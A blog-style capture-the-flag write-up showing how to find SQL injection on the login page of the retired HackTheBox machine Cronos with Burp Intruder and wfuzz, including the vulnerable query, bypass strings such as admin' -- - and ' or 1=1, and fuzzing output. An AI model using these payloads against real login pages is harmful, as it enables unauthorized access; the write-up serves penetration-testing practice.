---
layout: single
title: Login page Enumeration for SQLi using BurpSuite and wfuzz. 
date : "2020-03-26"
---

This article shows how to enumerate login page for SQL injection using burpsuite and Wfuzz, and I am considering Cronos machine from HackTheBox retired machines for this example.

{% capture fig_img %}
![Foo]({{ "/images/SQLi/SQLi_login_page.png"|relative_url}})
{% endcapture %}

<figure>
  {{ fig_img | markdownify | remove: "<p>" | remove: "</p>" }}
  <figcaption>Fig 1. Cronos login page.</figcaption>
</figure>


From initial enumeration, we know its a linux server running apache and uses php, which leads us to suspect a mysql database server running in backend to support login page.

lets visualize SQL query which will be accepting our user input data. 

~~~sql
$sql = "SELECT id FROM users 
WHERE username = '".$myusername."' and password = '".$mypassword."'";
~~~

ideally to bypass authentication we need to pass a username which would change the execution flow. 
And in this example, it is very simple to achieve it by passing **admin' -- -** where we comment the query after username field.

But queries can be complex sometimes and may not be so easy to visualize like in this example, so to speed up the enumeration we can pass all the possible combinations to the username field and test for SQLi.

To achieve, I am using a work list from the [link](https://github.com/swisskyrepo PayloadsAllTheThings/tree/master/SQL%20Injection) and fuzz the user input field to find if the given field is vulnerable for the injection.

I have sent the request to burpsuite and passed it to burp intruder 

{% capture fig_img %}
![Foo]({{ "/images/SQLi/SQLi_burp_intruder.png" | relative_url }})
{% endcapture %}

<figure>
  {{ fig_img | markdownify | remove: "<p>" | remove: "</p>" }}
  <figcaption>Fig 2. Burp Suite Intruder.</figcaption>
</figure>


Set payload marker to fuzz username parameter and it does not matter what password we enter. and under payloads tab I have copied the list I obtained from the [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

{% capture fig_img %}
![Foo]({{ "/images/SQLi/SQLi_burp_intruder_payload.png" | relative_url }})
{% endcapture %}

<figure>
  {{ fig_img | markdownify | remove: "<p>" | remove: "</p>" }}
  <figcaption>Fig 3. Burp Suite Intruder payload.</figcaption>
</figure>


and now we are set to start fuzzing the login page.

{% capture fig_img %}
![Foo]({{ "/images/SQLi/SQLi_burp_intruder_result.png" | relative_url }})
{% endcapture %}

<figure>
  {{ fig_img | markdownify | remove: "<p>" | remove: "</p>" }}
  <figcaption>Fig 4. Burp Suite Intruder results.</figcaption>
</figure>


Now we have multiple 302 (URL redirects) which indicates the fuzzing was successful. 

This process can be slow on burp communnity edition, so alternatively wfuzz can be used for the same, sample code snippet of same is shown below.

~~~console
root@kali:~/Desktop/htb/cronos# wfuzz -c -z file,/opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt --hc 200 -d "username=FUZZ&password=admin" http://admin.cronos.htb 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://admin.cronos.htb/
Total requests: 267

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000201:  C=302     98 L	     215 W	   2580 Ch	  "x' or 1=1 or 'x'='y"
000217:  C=200     98 L	     221 W	   2618 Ch	  "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)000218:  C=200     98 L	     221 W	   2618 Ch	  "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 000216:  C=200     98 L	     221 W	   2618 Ch	  "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000228:  C=302     98 L	     215 W	   2580 Ch	  "' or 0=0 #"
000234:  C=302     98 L	     215 W	   2580 Ch	  "' or 1=1 or ''='"
000065:  C=302     98 L	     215 W	   2580 Ch	  "admin' or '"

Total time: 8.873858
Processed Requests: 267
Filtered Requests: 263
Requests/sec.: 30.08837

~~~
